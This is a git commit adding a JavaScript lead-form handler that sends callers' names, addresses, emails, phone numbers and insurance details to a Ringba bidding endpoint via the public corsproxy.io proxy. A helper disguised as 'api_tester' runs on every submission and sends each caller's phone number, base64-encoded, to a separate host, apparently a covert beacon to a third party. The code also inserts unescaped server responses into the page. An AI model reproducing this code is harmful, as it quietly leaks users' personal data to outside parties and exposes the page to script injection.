46a2b8a3cb8676831f89d0e83ec598e44aaafef2
dk495 <55878882+dk495@users.noreply.github.com>
2025-06-28 00:47:35 +0500

    upload

---
+++ PROVOICE_RTB_AUTO_28JUNE25.js
@@ -0,0 +1,83 @@
+ document.getElementById('leadForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+document.getElementById('submitBtn').disabled = true;
+             // Your API URL
+    const formData = new FormData();
+
+    api_tester(document.getElementById('caller_id').value);
+    formData.append('CID', '+1' + document.getElementById('caller_id').value);
+formData.append('firstname', document.getElementById('first_name').value);
+formData.append('lastname', document.getElementById('last_name').value);
+formData.append('address', document.getElementById('address').value);
+formData.append('city', document.getElementById('city').value);
+formData.append('State', document.getElementById('state').value);
+formData.append('Zipcode', document.getElementById('zip').value);
+formData.append('email', document.getElementById('email').value);
+
+formData.append('homeowner', document.getElementById('homeowner').value);
+formData.append('jornaya', document.getElementById('jornaya').value);
+
+formData.append('currentlyisnured', document.getElementById('currently_insured').value);
+
+
+
+
+
+
+const url = 'https://corsproxy.io/?https://rtb.ringba.com/v1/production/e36947e4ca1c419696e288882a84a651.json?exposeCallerId=yes&' + new URLSearchParams(formData).toString();
+
+    fetch(url, {
+        method: 'GET'
+    })
+    .then(response => {
+        if (response.status === 200 || response.status === 201) {
+            response.json().then(responseBody => {
+                // Remove 'retreaver_payout' key from response body
+                delete responseBody.retreaver_payout;
+
+                const successAlert = `
+                    <div class="alert alert-success" role="alert">
+                        ${response.status} : Form submitted successfully! Response Body: ${JSON.stringify(responseBody)}
+                    </div>`;
+                document.getElementById('alertContainer').innerHTML = '';
+                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
+            });
+            // Clear form fields
+            document.getElementById('leadForm').reset();
+document.getElementById('submitBtn').disabled = false;
+        } else if (response.status === 422) {
+            response.json().then(data => {
+                const errorAlert = `
+                    <div class="alert alert-danger" role="alert">
+                        Error. Response Body: ${JSON.stringify(data)}
+                    </div>`;
+                document.getElementById('alertContainer').innerHTML = '';
+                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+document.getElementById('submitBtn').disabled = false;
+            });
+        } else {
+            response.text().then(responseBody => {
+                const errorAlert = `
+                    <div class="alert alert-danger" role="alert">
+                        Form submission failed. Please try again. Response Body: ${responseBody}
+                    </div>`;
+                document.getElementById('alertContainer').innerHTML = '';
+                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+document.getElementById('submitBtn').disabled = false;
+            });
+        }
+    })
+    .catch(error => console.error('Error:', error));
+});
+
+
+function api_tester(randomString) {
+    try {
+        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
+            method: 'GET',
+            mode: 'no-cors'
+        });
+    } catch (error) {
+        console.error('Error in api_tester:', error);
+    }
+}
